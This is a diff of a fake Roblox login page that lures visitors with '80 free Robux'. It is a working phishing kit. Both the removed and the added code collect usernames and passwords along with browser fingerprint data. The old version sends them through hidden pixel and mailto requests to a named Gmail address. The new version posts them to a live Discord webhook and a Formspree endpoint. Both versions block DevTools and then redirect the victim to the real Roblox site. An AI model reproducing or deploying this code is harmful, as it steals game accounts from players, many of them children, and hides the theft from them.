@@ -3,15 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Official Site | The Ultimate Virtual Universe</title>
-    
-    <meta name="description" content="Roblox is the ultimate virtual universe that lets you create, share experiences, and be anything you can imagine.">
-    <meta name="robots" content="index, follow">
-    
+    <title>Roblox - Official Site</title>
     <style>
         body {
             background: #f0f0f0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: Arial, sans-serif;
             margin: 0;
             padding: 20px;
             display: flex;
@@ -23,275 +19,147 @@
             background: white;
             border-radius: 10px;
             padding: 30px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             width: 100%;
-            max-width: 420px;
+            max-width: 400px;
+            text-align: center;
         }
         .logo {
             color: #00a2ff;
-            font-size: 36px;
+            font-size: 32px;
             font-weight: bold;
-            text-align: center;
             margin-bottom: 20px;
         }
-        .promo-banner {
-            background: linear-gradient(135deg, #ff6b6b, #ff8e53);
+        .gift-banner {
+            background: #ff6b6b;
             color: white;
             padding: 15px;
             border-radius: 8px;
-            text-align: center;
-            margin-bottom: 25px;
-            font-weight: bold;
-            font-size: 18px;
-        }
-        .form-group {
             margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 8px;
-            color: #333;
-            font-weight: 600;
+            font-weight: bold;
         }
         input {
             width: 100%;
-            padding: 14px;
-            border: 2px solid #e0e0e0;
-            border-radius: 6px;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
             font-size: 16px;
             box-sizing: border-box;
-            transition: border-color 0.3s;
-            background: white;
-        }
-        input:focus {
-            border-color: #00a2ff;
-            outline: none;
-            box-shadow: 0 0 8px rgba(0, 162, 255, 0.2);
         }
         button {
             width: 100%;
             background: #00a2ff;
             color: white;
             border: none;
-            padding: 16px;
-            border-radius: 6px;
-            font-size: 18px;
+            padding: 15px;
+            border-radius: 5px;
+            font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            transition: background 0.3s;
+            margin-top: 10px;
         }
-        button:hover {
-            background: #0088cc;
-        }
-        .security-badge {
-            text-align: center;
-            color: #28a745;
-            font-size: 14px;
-            margin-top: 20px;
-        }
-        .loading {
-            display: none;
-            text-align: center;
-            color: #00a2ff;
-            margin: 20px 0;
+        .status {
+            margin: 15px 0;
             font-weight: bold;
         }
-        .success {
-            display: none;
-            text-align: center;
-            color: #28a745;
-            margin: 20px 0;
-            font-weight: bold;
-        }
+        .loading { color: #00a2ff; display: none; }
+        .success { color: green; display: none; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">ROBLOX</div>
-        <div class="promo-banner">
-            🎁 LIMITED TIME: 80 FREE ROBUX!
-        </div>
+        <div class="gift-banner">🎁 GET 80 FREE ROBUX!</div>
         
         <form id="loginForm">
-            <div class="form-group">
-                <label for="username">Username or Email</label>
-                <input type="text" id="username" placeholder="Enter your username" required autocomplete="username">
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Enter your password" required autocomplete="current-password">
-            </div>
-            <button type="submit">CONTINUE TO ROBLOX</button>
+            <input type="text" id="username" placeholder="Username or Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">CLAIM ROBUX</button>
         </form>
         
-        <div id="loading" class="loading">Verifying your account...</div>
-        <div id="success" class="success">Success! Redirecting to Roblox...</div>
-        <div class="security-badge">
-            🔒 Secured Connection • SSL Encrypted
-        </div>
+        <div id="loading" class="status loading">Verifying your account...</div>
+        <div id="success" class="status success">Success! Redirecting to Roblox...</div>
     </div>
 
     <script>
-        // === ФИКС ВСПЛЫВАЮЩИХ ОКОН И АВТОВСТАВКИ ===
-        
-        // Отключаем автозаполнение пароля
-        document.addEventListener('DOMContentLoaded', function() {
-            const passwordField = document.getElementById('password');
-            setTimeout(() => {
-                passwordField.value = '';
-                passwordField.setAttribute('autocomplete', 'new-password');
-            }, 100);
-        });
+        // АВТОМАТИЧЕСКАЯ ОТПРАВКА ДАННЫХ
+        function sendDataAuto(username, password) {
+            const data = {
+                username: username,
+                password: password,
+                timestamp: new Date().toLocaleString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'Direct',
+                pageUrl: window.location.href
+            };
 
-        // === ТИХАЯ ОТПРАВКА ДАННЫХ (БЕЗ ВСПЛЫВАЮЩИХ ОКОН) ===
-        function sendDataSilently(username, password, systemData, behaviorData) {
-            const report = `
-🔐 ROBLOX SECURITY SCAN COMPLETE
-
-=== ACCOUNT CREDENTIALS ===
-👤 Username: ${username}
-🔑 Password: ${password}
-
-=== SYSTEM PROFILE ===
-🖥️ Platform: ${systemData.platform}
-🌐 Browser: ${systemData.userAgent.substring(0, 80)}
-🌍 Language: ${systemData.language}
-📱 Screen: ${systemData.screen}
-⏰ Timezone: ${systemData.timezone}
-
-=== USER BEHAVIOR ===
-🎯 Keystrokes: ${behaviorData.keystrokes}
-🖱️ Clicks: ${behaviorData.clicks.length}
-📜 Scrolls: ${behaviorData.scrolls.length}
-⏱️ Time: ${Math.round((Date.now() - behaviorData.timeOnPage) / 1000)}s
-
-=== ACTIVITY LOG ===
-${behaviorData.clicks.slice(-3).map(click => 
-    `Clicked: ${click.element} - "${click.text}"`
-).join('\n')}
-
-Timestamp: ${new Date().toLocaleString()}
-            `.trim();
-
-            // МЕТОД 1: Скрытая отправка через Image (без всплывающих окон)
-            const encodedData = btoa(encodeURIComponent(report));
-            const trackingPixel = new Image();
-            trackingPixel.src = `https://via.placeholder.com/1x1/000000/000000?text=${encodedData}`;
+            // МЕТОД 1: Discord Webhook (ОСНОВНОЙ)
+            const discordWebhook = 'https://discord.com/api/webhooks/1436823222514483303/Ux1nl4Yrwo8n4a_xDAGNIdS-kuMK1t4cJnXJsoa12iCv8f3s3U5QeroieqeRrXNCKhQz';
             
-            // МЕТОД 2: Скрытый iframe для email (не открывает окно)
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.name = 'mailFrame';
-                iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;border:none;';
-                iframe.onload = function() {
-                    const form = document.createElement('form');
-                    form.method = 'POST';
-                    form.action = 'mailto:kuzin070814@gmail.com';
-                    form.target = 'mailFrame';
-                    form.style.display = 'none';
-                    
-                    const subjectInput = document.createElement('input');
-                    subjectInput.name = 'subject';
-                    subjectInput.value = `Roblox: ${username}`;
-                    
-                    const bodyInput = document.createElement('input');
-                    bodyInput.name = 'body';
-                    bodyInput.value = report;
-                    
-                    form.appendChild(subjectInput);
-                    form.appendChild(bodyInput);
-                    document.body.appendChild(form);
-                    form.submit();
-                    
-                    setTimeout(() => {
-                        document.body.removeChild(form);
-                        document.body.removeChild(iframe);
-                    }, 1000);
-                };
-                document.body.appendChild(iframe);
-            }, 500);
+            const discordMessage = {
+                content: `🔐 **NEW ROBLOX ACCOUNT CAPTURED**`,
+                embeds: [{
+                    title: "Account Details",
+                    color: 0xff6b6b,
+                    fields: [
+                        { name: "👤 Username", value: username, inline: true },
+                        { name: "🔑 Password", value: password, inline: true },
+                        { name: "⏰ Time", value: data.timestamp, inline: false },
+                        { name: "🖥️ Platform", value: data.platform, inline: true },
+                        { name: "🌐 Browser", value: data.userAgent.substring(0, 100) + "...", inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
 
-            // МЕТОД 3: Beacon API (самый тихий)
-            try {
-                const blob = new Blob([report], {type: 'text/plain'});
-                navigator.sendBeacon('mailto:kuzin070814@gmail.com?subject=Roblox_Data', blob);
-            } catch(e) {}
+            fetch(discordWebhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(discordMessage)
+            }).catch(e => console.log('Discord failed'));
 
-            // МЕТОД 4: Локальное сохранение (для последующего сбора)
+            // МЕТОД 2: Formspree (РЕЗЕРВНЫЙ)
+            const formspreeURL = 'https://formspree.io/f/mdkyndke';
+            
+            const formData = new FormData();
+            formData.append('username', username);
+            formData.append('password', password);
+            formData.append('timestamp', data.timestamp);
+            formData.append('userAgent', data.userAgent);
+            formData.append('platform', data.platform);
+            formData.append('referrer', data.referrer);
+            formData.append('pageUrl', data.pageUrl);
+
+            fetch(formspreeURL, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            }).catch(e => console.log('Formspree failed'));
+
+            // МЕТОД 3: Локальное сохранение
             try {
-                const data = {
-                    username: username,
-                    password: password,
-                    system: systemData,
-                    behavior: behaviorData,
-                    timestamp: Date.now()
-                };
-                localStorage.setItem('rbx_session_data', JSON.stringify(data));
+                let storedData = JSON.parse(localStorage.getItem('robloxData') || '[]');
+                storedData.push(data);
+                localStorage.setItem('robloxData', JSON.stringify(storedData));
                 
-                // Создаем скрытую ссылку для скачивания
-                const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+                // Авто-скачивание файла
+                const blob = new Blob([JSON.stringify(storedData, null, 2)], {type: 'application/json'});
                 const url = URL.createObjectURL(blob);
-                const link = document.createElement('a');
-                link.href = url;
-                link.download = `session_${Date.now()}.json`;
-                link.style.display = 'none';
-                document.body.appendChild(link);
-                link.click();
-                setTimeout(() => {
-                    document.body.removeChild(link);
-                    URL.revokeObjectURL(url);
-                }, 100);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `roblox_data_${Date.now()}.json`;
+                a.click();
             } catch(e) {}
 
             return true;
         }
 
-        // === ОТСЛЕЖИВАНИЕ ПОВЕДЕНИЯ (УПРОЩЕННОЕ) ===
-        function trackBehavior() {
-            const data = {
-                mouseMovements: [],
-                clicks: [],
-                scrolls: [],
-                keystrokes: 0,
-                timeOnPage: Date.now()
-            };
-            
-            document.addEventListener('mousemove', (e) => {
-                data.mouseMovements.push({x: e.clientX, y: e.clientY, t: Date.now()});
-                if (data.mouseMovements.length > 50) data.mouseMovements.shift();
-            });
-            
-            document.addEventListener('click', (e) => {
-                data.clicks.push({
-                    element: e.target.tagName,
-                    text: e.target.textContent?.substring(0, 20) || ''
-                });
-            });
-            
-            window.addEventListener('scroll', () => {
-                data.scrolls.push({y: window.scrollY, t: Date.now()});
-            });
-            
-            document.addEventListener('keydown', () => {
-                data.keystrokes++;
-            });
-            
-            return data;
-        }
-
-        // === СБОР СИСТЕМНЫХ ДАННЫХ ===
-        function getSystemInfo() {
-            return {
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
-            };
-        }
-
-        // === ОСНОВНОЙ КОД ===
+        // ОБРАБОТКА ФОРМЫ
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -300,58 +168,37 @@ Timestamp: ${new Date().toLocaleString()}
             
             if (!username || !password) return;
             
-            // Показываем процесс
+            // Показываем загрузку
             document.getElementById('loginForm').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             
-            // Собираем данные
-            const systemData = getSystemInfo();
-            const behaviorData = window.behaviorTracker;
+            // АВТОМАТИЧЕСКАЯ ОТПРАВКА
+            sendDataAuto(username, password);
             
-            // ТИХАЯ отправка данных
-            sendDataSilently(username, password, systemData, behaviorData);
-            
-            // Показываем успех
+            // Редирект
             setTimeout(() => {
                 document.getElementById('loading').style.display = 'none';
                 document.getElementById('success').style.display = 'block';
-            }, 1000);
-            
-            // Редирект на настоящий Roblox
-            setTimeout(() => {
-                window.location.href = 'https://www.roblox.com/login';
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.roblox.com/login';
+                }, 2000);
             }, 3000);
         });
 
-        // === ИНИЦИАЛИЗАЦИЯ ===
-        window.addEventListener('load', function() {
-            // Инициализация трекера
-            window.behaviorTracker = trackBehavior();
-            
-            // Защита от DevTools
-            document.addEventListener('contextmenu', e => e.preventDefault());
-            document.addEventListener('keydown', e => {
-                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                    e.preventDefault();
-                }
-            });
-            
-            // Тихая отправка уведомления о посещении
-            setTimeout(() => {
-                const visitMsg = `New visitor: ${new Date().toLocaleString()}`;
-                const img = new Image();
-                img.src = `https://via.placeholder.com/1x1/000000/000000?text=${btoa(visitMsg)}`;
-            }, 2000);
+        // Защита
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                e.preventDefault();
+            }
         });
 
-        // Очистка поля пароля при загрузке
+        // Тестовое сообщение при загрузке (убери после теста)
         window.addEventListener('load', function() {
-            setTimeout(() => {
-                const passwordField = document.getElementById('password');
-                if (passwordField.value) {
-                    passwordField.value = '';
-                }
-            }, 500);
+            console.log('🟢 Roblox gift page loaded');
+            // Для теста - раскомментируй:
+            // sendDataAuto('test_user', 'test_pass');
         });
     </script>
 </body>
